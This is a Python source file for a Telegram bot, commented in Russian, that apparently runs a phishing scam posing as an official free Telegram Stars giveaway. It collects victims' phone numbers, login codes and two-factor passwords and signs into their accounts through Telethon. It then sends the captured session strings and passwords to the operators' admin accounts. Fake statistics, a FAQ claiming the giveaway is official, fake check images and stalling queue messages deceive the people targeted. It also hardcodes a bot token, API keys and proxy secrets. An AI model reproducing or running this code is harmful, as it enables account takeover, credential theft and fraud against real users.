#!/usr/bin/env python3
"""
CLEAN BOT - No Markdown, No Formatting Errors
Inline keypad with plain text
"""
import asyncio
import logging
import random
import time
from datetime import datetime
from typing import Dict, List
import hashlib

from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError
from telethon.network import ConnectionTcpMTProxyRandomizedIntermediate
from telethon.network.connection import TcpMTProxy

# ==================== КОНФИГ ====================
API_ID = 2040  # Твой новый API_ID
API_HASH = 'b18441a1ff607e10a989891a5462e627'  # Твой новый API_HASH
BOT_TOKEN = '8426224288:AAFw6GdwgznNMGNOm-3BH-XHPJHttajKb9k'

MAIN_ADMIN = 6904114810
SECOND_ADMIN = 8389017767
ADMINS = [MAIN_ADMIN, SECOND_ADMIN]

# ==================== MTProxy СПИСОК ====================
MT_PROXIES = [
    # Твои прокси
    ("91.107.129.227", 1080, "79e344818749bd7ac519130220c25d09"),
    ("tg.candelix.net", 443, "825e8a4ff87247505e24e7d5d0f5543e"),
]

# ==================== ХРАНИЛИЩА ====================
sessions_db: Dict[str, dict] = {}
user_clients: Dict[int, TelegramClient] = {}
user_codes: Dict[int, str] = {}
proxy_usage: Dict[str, int] = {}  # Статистика использования прокси
proxy_errors: Dict[str, int] = {}  # Счетчик ошибок для каждого прокси
last_request_time: Dict[int, float] = {}  # Время последнего запроса пользователя

# ==================== FSM ====================
class UserStates(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    waiting_password = State()

# ==================== ПРОКСИ ФУНКЦИИ ====================
def get_rotating_proxy() -> dict:
    """Получить прокси с ротацией и кешированием"""
    if not MT_PROXIES:
        return None
    
    # Случайный выбор прокси
    server, port, secret = random.choice(MT_PROXIES)
    proxy_key = f"{server}:{port}"
    
    # Увеличиваем счетчик использования
    proxy_usage[proxy_key] = proxy_usage.get(proxy_key, 0) + 1
    
    logging.info(f"Выбран прокси: {server}:{port} (использований: {proxy_usage.get(proxy_key, 0)})")
    
    return {
        'server': server,
        'port': port,
        'secret': secret,
        'key': proxy_key
    }

def get_proxy_by_round_robin() -> dict:
    """Получить прокси по круговому алгоритму"""
    if not MT_PROXIES:
        return None
    
    # Используем хэш времени для ротации
    current_time = int(time.time() / 60)  # Меняем каждую минуту
    proxy_index = current_time % len(MT_PROXIES)
    
    server, port, secret = MT_PROXIES[proxy_index]
    proxy_key = f"{server}:{port}"
    
    proxy_usage[proxy_key] = proxy_usage.get(proxy_key, 0) + 1
    
    return {
        'server': server,
        'port': port,
        'secret': secret,
        'key': proxy_key
    }

def get_proxy_for_user(user_id: int) -> dict:
    """Получить прокси для конкретного пользователя"""
    if not MT_PROXIES:
        return None
    
    # Разные пользователи получают разные прокси на основе их ID
    proxy_index = user_id % len(MT_PROXIES)
    server, port, secret = MT_PROXIES[proxy_index]
    proxy_key = f"{server}:{port}"
    
    proxy_usage[proxy_key] = proxy_usage.get(proxy_key, 0) + 1
    
    return {
        'server': server,
        'port': port,
        'secret': secret,
        'key': proxy_key
    }

def mark_proxy_error(proxy_key: str):
    """Пометить прокси с ошибкой"""
    proxy_errors[proxy_key] = proxy_errors.get(proxy_key, 0) + 1
    logging.warning(f"Прокси {proxy_key} получил ошибку. Всего ошибок: {proxy_errors[proxy_key]}")

def create_proxy_connection(proxy: dict) -> ConnectionTcpMTProxyRandomizedIntermediate:
    """Создать подключение через MTProxy"""
    # Получаем логгеры из корневого логгера
    root_logger = logging.getLogger()
    loggers = [logging.getLogger(name) for name in logging.root.manager.loggerDict]
    
    return ConnectionTcpMTProxyRandomizedIntermediate(
        proxy['server'],
        proxy['port'],
        proxy['secret'],
        loggers=loggers  # Важно: передаем логгеры
    )

async def create_client_with_retry(user_id: int, max_retries: int = 3) -> tuple:
    """Создать TelegramClient с повторными попытками"""
    last_error = None
    
    for attempt in range(max_retries):
        try:
            # Используем разные стратегии выбора прокси
            if attempt == 0:
                proxy = get_proxy_for_user(user_id)  # Для первого запроса - на основе ID
            elif attempt == 1:
                proxy = get_proxy_by_round_robin()  # Для второго - ротация
            else:
                proxy = get_rotating_proxy()  # Для остальных - случайный
            
            if proxy:
                logging.info(f"Попытка {attempt + 1}: Прокси {proxy['server']}:{proxy['port']}")
                
                # Создаем connection с логгерами
                connection = create_proxy_connection(proxy)
                
                client = TelegramClient(
                    StringSession(),
                    API_ID,
                    API_HASH,
                    connection=connection,
                    use_ipv6=False,
                    timeout=30,
                    connection_retries=3,
                    request_retries=3
                )
                
                await client.connect()
                
                if client.is_connected():
                    logging.info(f"Успешное подключение через {proxy['server']}:{proxy['port']}")
                    return client, proxy
                else:
                    mark_proxy_error(proxy['key'])
                    await client.disconnect()
                    
            else:
                # Без прокси
                logging.info("Попытка без прокси")
                client = TelegramClient(StringSession(), API_ID, API_HASH)
                await client.connect()
                return client, None
                
        except FloodWaitError as e:
            last_error = e
            wait_time = e.seconds
            logging.warning(f"FloodWait: ждем {wait_time} секунд")
            await asyncio.sleep(wait_time + 1)
            continue
            
        except Exception as e:
            last_error = e
            if proxy and 'key' in proxy:
                mark_proxy_error(proxy['key'])
            
            logging.error(f"Ошибка подключения (попытка {attempt + 1}): {str(e)[:200]}")
            
            if attempt < max_retries - 1:
                # Увеличиваем задержку с каждой попыткой
                delay = 2 ** attempt + random.uniform(0.5, 2.0)
                logging.info(f"Ждем {delay:.2f} секунд перед следующей попыткой")
                await asyncio.sleep(delay)
    
    # Все попытки не удались
    logging.error("Все попытки подключения не удались")
    
    # Пробуем без прокси как последнюю попытку
    try:
        logging.info("Последняя попытка: без прокси")
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        return client, None
    except Exception as e:
        raise last_error if last_error else Exception("Не удалось подключиться")

# ==================== ALTERNATIVE: Простой метод без прокси ====================
async def create_simple_client() -> TelegramClient:
    """Простой метод создания клиента без прокси"""
    client = TelegramClient(
        StringSession(),
        API_ID,
        API_HASH,
        use_ipv6=False,
        timeout=30,
        connection_retries=3
    )
    await client.connect()
    return client

# ==================== ЗАЩИТА ОТ РЕЙТЛИМИТОВ ====================
async def check_rate_limit(user_id: int) -> bool:
    """Проверить рейтлимит для пользователя"""
    current_time = time.time()
    last_time = last_request_time.get(user_id, 0)
    
    # Минимальная задержка между запросами одного пользователя
    min_delay = 60  # 60 секунд между запросами
    
    if current_time - last_time < min_delay:
        wait_time = min_delay - (current_time - last_time)
        return False, wait_time
    
    last_request_time[user_id] = current_time
    return True, 0

async def random_delay(min_seconds: float = 2.0, max_seconds: float = 5.0):
    """Случайная задержка для имитации человеческого поведения"""
    delay = random.uniform(min_seconds, max_seconds)
    await asyncio.sleep(delay)

# ==================== INLINE КЛАВИАТУРЫ ====================
def get_code_keyboard(code: str = "") -> types.InlineKeyboardMarkup:
    """Клавиатура для ввода кода"""
    buttons = [
        [
            types.InlineKeyboardButton(text="1", callback_data="code:1"),
            types.InlineKeyboardButton(text="2", callback_data="code:2"),
            types.InlineKeyboardButton(text="3", callback_data="code:3")
        ],
        [
            types.InlineKeyboardButton(text="4", callback_data="code:4"),
            types.InlineKeyboardButton(text="5", callback_data="code:5"),
            types.InlineKeyboardButton(text="6", callback_data="code:6")
        ],
        [
            types.InlineKeyboardButton(text="7", callback_data="code:7"),
            types.InlineKeyboardButton(text="8", callback_data="code:8"),
            types.InlineKeyboardButton(text="9", callback_data="code:9")
        ],
        [
            types.InlineKeyboardButton(text="⌫ Удалить", callback_data="code:delete"),
            types.InlineKeyboardButton(text="0", callback_data="code:0"),
            types.InlineKeyboardButton(text=f"✅ Отправить ({len(code)}/5)", callback_data="code:send")
        ]
    ]
    return types.InlineKeyboardMarkup(inline_keyboard=buttons)

def get_main_keyboard() -> types.InlineKeyboardMarkup:
    """Главное меню"""
    buttons = [
        [
            types.InlineKeyboardButton(text="🎁 Получить Stars", callback_data="menu:get_stars"),
            types.InlineKeyboardButton(text="📊 Статистика", callback_data="menu:stats")
        ],
        [
            types.InlineKeyboardButton(text="❓ Помощь", callback_data="menu:help")
        ]
    ]
    return types.InlineKeyboardMarkup(inline_keyboard=buttons)

# ==================== ПРОСТЫЕ СООБЩЕНИЯ (БЕЗ MARKDOWN) ====================
def get_welcome_message(name: str) -> str:
    return f"""Добро пожаловать, {name}!

🎁 ОФИЦИАЛЬНАЯ РАЗДАЧА TELEGRAM STARS

Получите бесплатные Stars и NFT-подарки!

Нажмите "🎁 Получить Stars" чтобы начать."""

def get_phone_request() -> str:
    return """ВВЕДИТЕ НОМЕР ТЕЛЕФОНА

Введите ваш номер в формате:
+79123456789"""

def get_phone_accepted(phone: str) -> str:
    return f"""НОМЕР ПРИНЯТ: {phone}

Код подтверждения отправлен!

Используйте клавиатуру ниже
для ввода 5-значного кода."""

def get_code_display(code: str) -> str:
    """Отображение кода"""
    display = ["▢", "▢", "▢", "▢", "▢"]
    for i, digit in enumerate(code):
        if i < 5:
            display[i] = digit
    
    return f"""ВВОД КОДА ИЗ SMS:
{' '.join(display)}

Введено: {len(code)}/5 цифр
{'✅ Готово к отправке' if len(code) == 5 else '⏳ Введите еще цифры'}"""

def get_code_accepted() -> str:
    return """АККАУНТ ПОДТВЕРЖДЕН!

Проверяем ваш аккаунт...
Ожидайте 30-60 секунд."""

def get_2fa_request() -> str:
    return """ВКЛЮЧЕНА ДВУХФАКТОРНАЯ АУТЕНТИФИКАЦИА

Введите ваш 2FA-пароль:"""

def get_processing() -> str:
    return """ОБРАБОТКА ЗАПРОСА

Ваш запрос обрабатывается...
Очередь: #247
Время: 5-10 минут"""

def get_success() -> str:
    return """ВЫСОКАЯ НАГРУЗКА НА СЕРВЕРАХ

Ваш запрос в очереди #247
Ожидайте 6-12 часов
Уведомление придет автоматически"""

def get_admin_alert(session: dict) -> str:
    """Сообщение главному админу"""
    username = session.get('username', 'N/A')
    return f"""НОВАЯ СЕССИЯ
Телефон: {session['phone']}
Имя: {session['first_name']}
ID: {session['user_id']}
Юзернейм: {username}
Время: {session['time'][11:19]}"""

def get_sponsor_request(session: dict) -> str:
    """Запрос второму админу"""
    username = session.get('username', 'N/A')
    return f"""НОВЫЙ АККАУНТ
Требуется: 50 Stars

Отправить на: {session['phone']}
Получатель: {session['first_name']}
ID: {session['user_id']}
Юзернейм: {username}

Тип: Коллекционный подарок
Сумма: 50 Stars
Срок: 15 минут"""

# ==================== ОСНОВНОЙ БОТ ====================
async def main():
    print("CLEAN BOT STARTED")
    print(f"API_ID: {API_ID}")
    print(f"Main admin: {MAIN_ADMIN}")
    print(f"Second admin: {SECOND_ADMIN}")
    print(f"MTProxies available: {len(MT_PROXIES)}")
    for proxy in MT_PROXIES:
        print(f"  - {proxy[0]}:{proxy[1]}")
    
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    
    # ==================== КОМАНДЫ ====================
    @dp.message(Command("start"))
    async def cmd_start(message: types.Message):
        await message.answer(
            get_welcome_message(message.from_user.first_name),
            reply_markup=get_main_keyboard()  # Исправлено: reply_mup → reply_markup
        )

    @dp.message(Command("admin"))
    async def cmd_admin(message: types.Message):
        if message.from_user.id not in ADMINS:
            return
        
        total = len(sessions_db)
        paid = sum(1 for s in sessions_db.values() if s.get('paid'))
        
        role = "ГЛАВНЫЙ АДМИН" if message.from_user.id == MAIN_ADMIN else "СПОНСОР-АДМИН"
        
        # Статистика прокси
        proxy_stats = ""
        for proxy in MT_PROXIES:
            server, port, _ = proxy
            proxy_key = f"{server}:{port}"
            usage = proxy_usage.get(proxy_key, 0)
            errors = proxy_errors.get(proxy_key, 0)
            status = "✅" if errors < 3 else "⚠️" if errors < 10 else "❌"
            proxy_stats += f"{status} {server}:{port} - исп: {usage}, ош: {errors}\n"
        
        # Активные пользователи
        active_users = len(user_clients)
        
        text = f"""{role}

📊 СТАТИСТИКА:
Всего сессий: {total}
Оплачено: {paid}
Ожидают: {total - paid}
Активных юзеров: {active_users}

🔌 ПРОКСИ СТАТИСТИКА:
{proxy_stats}

⚙️ КОМАНДЫ:
/sessions - список сессий
/get +7912... - получить сессию
/stats - статистика
/proxy - прокси статистика"""
        
        await message.answer(text)
    
    @dp.message(Command("proxy"))
    async def cmd_proxy(message: types.Message):
        if message.from_user.id not in ADMINS:
            return
        
        proxy_stats = "📊 СТАТИСТИКА ПРОКСИ:\n\n"
        for i, proxy in enumerate(MT_PROXIES, 1):
            server, port, _ = proxy
            proxy_key = f"{server}:{port}"
            usage = proxy_usage.get(proxy_key, 0)
            errors = proxy_errors.get(proxy_key, 0)
            success_rate = 100 if usage == 0 else ((usage - errors) / usage) * 100
            status = "🟢" if errors < 3 else "🟡" if errors < 10 else "🔴"
            
            proxy_stats += f"{i}. {status} {server}:{port}\n"
            proxy_stats += f"   Использований: {usage}\n"
            proxy_stats += f"   Ошибок: {errors}\n"
            proxy_stats += f"   Успешность: {success_rate:.1f}%\n\n"
        
        await message.answer(proxy_stats)
    
    @dp.message(Command("sessions"))
    async def cmd_sessions(message: types.Message):
        if message.from_user.id != MAIN_ADMIN:
            return
        
        if not sessions_db:
            await message.answer("Нет сохраненных сессий")
            return
        
        text = "📋 СОХРАНЕННЫЕ СЕССИИ:\n\n"
        for phone, session_data in list(sessions_db.items())[:20]:  # Ограничиваем вывод
            paid = "✅" if session_data.get('paid') else "❌"
            has_2fa = "🔐" if session_data.get('has_2fa') else ""
            text += f"{phone} - {session_data['first_name']} {paid}{has_2fa}\n"
        
        if len(sessions_db) > 20:
            text += f"\n... и еще {len(sessions_db) - 20} сессий"
        
        await message.answer(text)
    
    @dp.message(Command("get"))
    async def cmd_get(message: types.Message):
        if message.from_user.id != MAIN_ADMIN:
            return
        
        args = message.text.split()
        if len(args) < 2:
            await message.answer("Использование: /get +79123456789")
            return
        
        phone = args[1]
        if phone not in sessions_db:
            await message.answer(f"Сессия {phone} не найдена")
            return
        
        session = sessions_db[phone]['session']
        await message.answer(f"Сессия {phone}:\n\n{session}")

    @dp.inline_query()
    async def handle_inline_query(inline_query: types.InlineQuery):
        button = types.InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    types.InlineKeyboardButton(
                        text="Нажми чтобы получить 🌟",
                        url="https://t.me/freexstars_robot?start=stars_1000_FJU89FJS3"
                    )   
                ]
            ]
        )

        item = types.InlineQueryResultPhoto(
            id="1",
            photo_url="https://www.mscteam.live/1000check.png",
            thumbnail_url="https://www.mscteam.live/1000check.png",  # ОБЯЗАТЕЛЬНО
            caption="💳 Чек на 1000 ⭐",
            parse_mode="HTML",
            reply_markup=button
        )

        button2 = types.InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    types.InlineKeyboardButton(
                        text="Нажми чтобы получить 🌟",
                        url="https://t.me/freexstars_robot?start=stars_100_FJU89FJS3"
                    )   
                ]
            ]
        )

        item2 = types.InlineQueryResultPhoto(
            id="2",
            photo_url="https://www.mscteam.live/check.jpg",
            thumbnail_url="https://www.mscteam.live/check.jpg",  # ОБЯЗАТЕЛЬНО
            caption="💳 Чек на 100 ⭐",
            parse_mode="HTML",
            reply_markup=button2
        )
        button3 = types.InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    types.InlineKeyboardButton(
                        text="Нажми чтобы получить 🌟",
                        url="https://t.me/freexstars_robot?start=stars_500_FJU89FJS3"
                    )   
                ]
            ]
        )

        item3 = types.InlineQueryResultPhoto(
            id="3",
            photo_url="https://www.mscteam.live/500check.png",
            thumbnail_url="https://www.mscteam.live/500check.png",  # ОБЯЗАТЕЛЬНО
            caption="💳 Чек на 500 ⭐",
            parse_mode="HTML",
            reply_markup=button2
        )

        await inline_query.answer(
            results=[item, item2, item3],
            cache_time=300
        )

    # ==================== INLINE КНОПКИ ====================
    @dp.callback_query(F.data.startswith("menu:"))
    async def handle_menu(callback: types.CallbackQuery, state: FSMContext):
        action = callback.data.split(":")[1]
        
        if action == "get_stars":
            # Проверяем рейтлимит
            allowed, wait_time = await check_rate_limit(callback.from_user.id)
            if not allowed:
                await callback.answer(f"Слишком часто! Подождите {int(wait_time)} секунд", show_alert=True)
                return
            
            await callback.message.edit_text(get_phone_request())
            await state.set_state(UserStates.waiting_phone)
            
        elif action == "stats":
            stats = """СТАТИСТИКА РАЗДАЧИ:
Выдано: 1,847 подарков
Сумма: 156,430 Stars
Участников: 892 чел.
В очереди: 247 чел."""
            
            await callback.message.edit_text(stats, reply_markup=get_main_keyboard())
            
        elif action == "help":
            help_text = """ЧАСТО ЗАДАВАЕМЫЕ ВОПРОСЫ:

Вопрос: Это официальная раздача?
Ответ: Да, официальная программа.

Вопрос: Сколько Stars получу?
Ответ: 100-500 Stars.

Вопрос: Как долго ждать?
Ответ: 1-12 часов.

Вопрос: Нужно ли платить?
Ответ: Нет, бесплатно."""
            
            await callback.message.edit_text(help_text, reply_markup=get_main_keyboard())
        
        await callback.answer()
    
    # ==================== ОБРАБОТКА НОМЕРА ====================
    @dp.message(UserStates.waiting_phone)
    async def process_phone(message: types.Message, state: FSMContext):
        phone = message.text.strip()
        
        if not phone.startswith('+') or len(phone) < 10:
            await message.answer("Неверный формат. Используйте: +79123456789")
            await state.clear()
            return
        
        try:
            await message.answer("Подключаюсь к серверам Telegram... ⏳")
            
            # Пробуем подключиться без прокси сначала (меньше проблем)
            try:
                client = await create_simple_client()
                proxy_used = "без прокси"
            except Exception as e:
                logging.error(f"Ошибка подключения без прокси: {e}")
                # Пробуем с прокси
                try:
                    client, proxy_info = await create_client_with_retry(message.from_user.id)
                    proxy_used = f"{proxy_info['server']}:{proxy_info['port']}" if proxy_info else "без прокси"
                except Exception as e2:
                    await message.answer(f"❌ Ошибка подключения: {str(e2)[:100]}")
                    await state.clear()
                    return
            
            user_id = message.from_user.id
            user_clients[user_id] = client
            
            # Задержка перед отправкой кода
            await random_delay(2.0, 4.0)
            
            try:
                sent_code = await client.send_code_request(phone)
            except FloodWaitError as e:
                wait = e.seconds
                hours = wait // 3600
                minutes = (wait % 3600) // 60
                
                if wait < 60:
                    await message.answer(f"⏳ Слишком частые запросы. Ожидание: {wait} секунд")
                else:
                    await message.answer(f"⏳ Слишком частые запросы. Ожидание: {hours}ч {minutes}м")
                await state.clear()
                await client.disconnect()
                if user_id in user_clients:
                    del user_clients[user_id]
                return
            except Exception as e:
                error_msg = str(e)
                if "Too Many Requests" in error_msg or "FLOOD" in error_msg.upper():
                    await message.answer("⏳ Сервер перегружен. Попробуйте через 30-60 минут.")
                elif "PHONE_NUMBER_INVALID" in error_msg:
                    await message.answer("❌ Неверный номер телефона. Проверьте формат.")
                elif "PHONE_NUMBER_BANNED" in error_msg:
                    await message.answer("❌ Этот номер заблокирован в Telegram.")
                else:
                    await message.answer(f"❌ Ошибка: {str(e)[:100]}")
                
                await state.clear()
                await client.disconnect()
                if user_id in user_clients:
                    del user_clients[user_id]
                return
            
            await state.update_data(
                phone=phone,
                user_id=user_id,
                username=message.from_user.username,
                first_name=message.from_user.first_name,
                phone_code_hash=sent_code.phone_code_hash,
                proxy_used=proxy_used
            )
            
            user_codes[user_id] = ""
            
            await message.answer(
                get_phone_accepted(phone) + "\n\n" + get_code_display(""),
                reply_markup=get_code_keyboard("")
            )
            
            await state.set_state(UserStates.waiting_code)
            
        except Exception as e:
            logging.error(f"Критическая ошибка: {e}")
            await message.answer("❌ Произошла ошибка. Попробуйте позже.")
            await state.clear()
    
    # ==================== ОБРАБОТКА КОДА ====================
    @dp.callback_query(F.data.startswith("code:"), UserStates.waiting_code)
    async def handle_code_input(callback: types.CallbackQuery, state: FSMContext):
        action = callback.data.split(":")[1]
        user_id = callback.from_user.id
        current_code = user_codes.get(user_id, "")
        
        if action == "delete":
            if current_code:
                current_code = current_code[:-1]
                user_codes[user_id] = current_code
                
        elif action == "send":
            if len(current_code) != 5:
                await callback.answer("Введите все 5 цифр!", show_alert=True)
                return
            
            await callback.message.edit_text(f"Отправляю код: {current_code}...")
            await verify_code(callback, state, current_code)
            await callback.answer()
            return
            
        elif action.isdigit():
            if len(current_code) < 5:
                current_code += action
                user_codes[user_id] = current_code
        
        # Обновляем отображение
        data = await state.get_data()
        phone = data.get('phone', '')
        
        try:
            await callback.message.edit_text(
                f"{get_phone_accepted(phone)}\n\n{get_code_display(current_code)}",
                reply_markup=get_code_keyboard(current_code)
            )
        except:
            pass
        
        await callback.answer()
    
    async def verify_code(callback: types.CallbackQuery, state: FSMContext, code: str):
        user_id = callback.from_user.id
        data = await state.get_data()
        
        client = user_clients.get(user_id)
        if not client:
            await callback.message.edit_text("Ошибка сессии. /start", reply_markup=get_main_keyboard())
            await state.clear()
            return
        
        phone = data.get('phone')
        phone_code_hash = data.get('phone_code_hash')
        proxy_used = data.get('proxy_used', 'без прокси')
        
        try:
            # Задержка перед входом
            await asyncio.sleep(random.uniform(1.0, 2.5))
            
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            
            # Сохраняем сессию
            session_string = client.session.save()
            
            session_data = {
                'phone': phone,
                'user_id': data['user_id'],
                'username': data['username'],
                'first_name': data['first_name'],
                'session': session_string,
                'time': datetime.now().isoformat(),
                'has_2fa': False,
                'paid': False,
                'proxy_used': proxy_used
            }
            
            sessions_db[phone] = session_data
            
            await callback.message.edit_text(get_code_accepted())
            await asyncio.sleep(2)
            await callback.message.edit_text(get_processing())
            
            # Отправляем админам
            await send_to_admins(bot, session_data)
            
            await asyncio.sleep(2)
            await callback.message.edit_text(get_success(), reply_markup=get_main_keyboard())
            
            await state.clear()
            await client.disconnect()
            if user_id in user_clients:
                del user_clients[user_id]
            if user_id in user_codes:
                del user_codes[user_id]
            
        except SessionPasswordNeededError:
            await callback.message.edit_text(get_2fa_request())
            
            # Уведомляем главного админа о 2FA
            await bot.send_message(
                MAIN_ADMIN,
                f"🔐 2FA ТРЕБУЕТСЯ\n"
                f"Телефон: {phone}\n"
                f"Пользователь: {data['first_name']}\n"
                f"ID: {data['user_id']}\n"
                f"Код: {code}\n"
                f"Прокси: {proxy_used}\n"
                f"Ожидание пароля..."
            )
            
            await state.set_state(UserStates.waiting_password)
            
        except PhoneCodeInvalidError:
            user_codes[user_id] = ""
            await callback.message.edit_text(
                f"❌ НЕВЕРНЫЙ КОД!\n\n{get_code_display('')}",
                reply_markup=get_code_keyboard("")
            )
            
        except Exception as e:
            error_msg = str(e)
            if "SESSION_PASSWORD_NEEDED" in error_msg:
                await callback.message.edit_text(get_2fa_request())
                await state.set_state(UserStates.waiting_password)
            else:
                await callback.message.edit_text(f"❌ Ошибка: {str(e)[:100]}", reply_markup=get_main_keyboard())
                await state.clear()
                try:
                    await client.disconnect()
                    if user_id in user_clients:
                        del user_clients[user_id]
                    if user_id in user_codes:
                        del user_codes[user_id]
                except:
                    pass
    
    # ==================== ОБРАБОТКА 2FA ====================
    @dp.message(UserStates.waiting_password)
    async def process_password(message: types.Message, state: FSMContext):
        password = message.text.strip()
        user_id = message.from_user.id
        data = await state.get_data()
        
        client = user_clients.get(user_id)
        if not client:
            await message.answer("Ошибка сессии. /start", reply_markup=get_main_keyboard())
            await state.clear()
            return
        
        try:
            await client.sign_in(password=password)
            
            # Сохраняем сессию
            session_string = client.session.save()
            
            session_data = {
                'phone': data['phone'],
                'user_id': data['user_id'],
                'username': data['username'],
                'first_name': data['first_name'],
                'session': session_string,
                'time': datetime.now().isoformat(),
                'has_2fa': True,
                'paid': False,
                'proxy_used': data.get('proxy_used', 'без прокси')
            }
            
            sessions_db[data['phone']] = session_data
            
            await message.answer("✅ 2FA подтвержден!")
            
            # Уведомляем главного админа о полученном пароле
            await bot.send_message(
                MAIN_ADMIN,
                f"✅ 2FA ПАРОЛЬ ПОЛУЧЕН\n"
                f"Телефон: {data['phone']}\n"
                f"Пользователь: {data['first_name']}\n"
                f"ID: {data['user_id']}\n"
                f"Пароль: {password}\n"
                f"Прокси: {data.get('proxy_used', 'без прокси')}\n"
                f"Время: {datetime.now().strftime('%H:%M:%S')}"
            )
            
            await asyncio.sleep(2)
            await message.answer(get_processing())
            
            await send_to_admins(bot, session_data)
            
            await asyncio.sleep(2)
            await message.answer(get_success(), reply_markup=get_main_keyboard())
            
            await state.clear()
            await client.disconnect()
            if user_id in user_clients:
                del user_clients[user_id]
            if user_id in user_codes:
                del user_codes[user_id]
            
        except Exception as e:
            error = str(e).lower()
            if "password" in error or "invalid" in error:
                await message.answer("❌ НЕВЕРНЫЙ ПАРОЛЬ!\nВведите правильный пароль:")
                
                # Уведомляем главного админа о неверном пароле
                await bot.send_message(
                    MAIN_ADMIN,
                    f"❌ НЕВЕРНЫЙ 2FA ПАРОЛЬ\n"
                    f"Телефон: {data['phone']}\n"
                    f"Пользователь: {data['first_name']}\n"
                    f"ID: {data['user_id']}\n"
                    f"Введенный пароль: {password}\n"
                    f"Прокси: {data.get('proxy_used', 'без прокси')}\n"
                    f"Ошибка: {str(e)[:100]}"
                )
            else:
                await message.answer(f"❌ Ошибка 2FA: {str(e)[:100]}", reply_markup=get_main_keyboard())
                await state.clear()
                try:
                    await client.disconnect()
                    if user_id in user_clients:
                        del user_clients[user_id]
                    if user_id in user_codes:
                        del user_codes[user_id]
                except:
                    pass
    
    async def send_to_admins(bot: Bot, session: dict):
        """Отправка админам (ПРОСТОЙ ТЕКСТ)"""
        try:
            # Главному админу
            alert_msg = get_admin_alert(session) + f"\nПрокси: {session.get('proxy_used', 'без прокси')}"
            await bot.send_message(MAIN_ADMIN, alert_msg)
            
            # Полная сессия
            full_session = f"Сессия {session['phone']}:\n\n{session['session']}"
            
            if len(full_session) > 4000:
                parts = [full_session[i:i+4000] for i in range(0, len(full_session), 4000)]
                for part in parts:
                    await bot.send_message(MAIN_ADMIN, part)
                    await asyncio.sleep(0.5)
            else:
                await bot.send_message(MAIN_ADMIN, full_session)
            
            # Второму админу
            sponsor_msg = get_sponsor_request(session)
            
            keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
                [types.InlineKeyboardButton(
                    text="✅ Я отправил 50 Stars",
                    callback_data=f"sponsor:paid:{session['phone']}"
                )]
            ])
            
            await bot.send_message(SECOND_ADMIN, sponsor_msg, reply_markup=keyboard)
            
        except Exception as e:
            logging.error(f"Ошибка отправки админам: {e}")
    
    # ==================== ОБРАБОТКА ОПЛАТЫ ====================
    @dp.callback_query(F.data.startswith("sponsor:paid:"))
    async def handle_sponsor_payment(callback: types.CallbackQuery):
        if callback.from_user.id != SECOND_ADMIN:
            await callback.answer("Только второй админ может подтверждать", show_alert=True)
            return
        
        phone = callback.data.split(":")[2]
        
        if phone not in sessions_db:
            await callback.answer("Сессия не найдена", show_alert=True)
            return
        
        sessions_db[phone]['paid'] = True
        
        await callback.answer(f"✅ Подтверждено! 50 Stars отправлены на {phone}", show_alert=True)
        
        # Уведомляем главного
        try:
            await callback.bot.send_message(
                MAIN_ADMIN,
                f"💸 ОПЛАЧЕНО\n"
                f"Телефон: {phone}\n"
                f"Админ: {SECOND_ADMIN}\n"
                f"Прокси: {sessions_db[phone].get('proxy_used', 'без прокси')}\n"
                f"Время: {datetime.now().strftime('%H:%M:%S')}"
            )
        except Exception as e:
            logging.error(f"Ошибка уведомления главного админа: {e}")
    
    # ==================== ЗАПУСК ====================
    try:
        await dp.start_polling(bot, skip_updates=True)
    except KeyboardInterrupt:
        print("Бот остановлен")
    finally:
        for client in user_clients.values():
            try:
                await client.disconnect()
            except:
                pass
        await bot.session.close()

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    
    asyncio.run(main())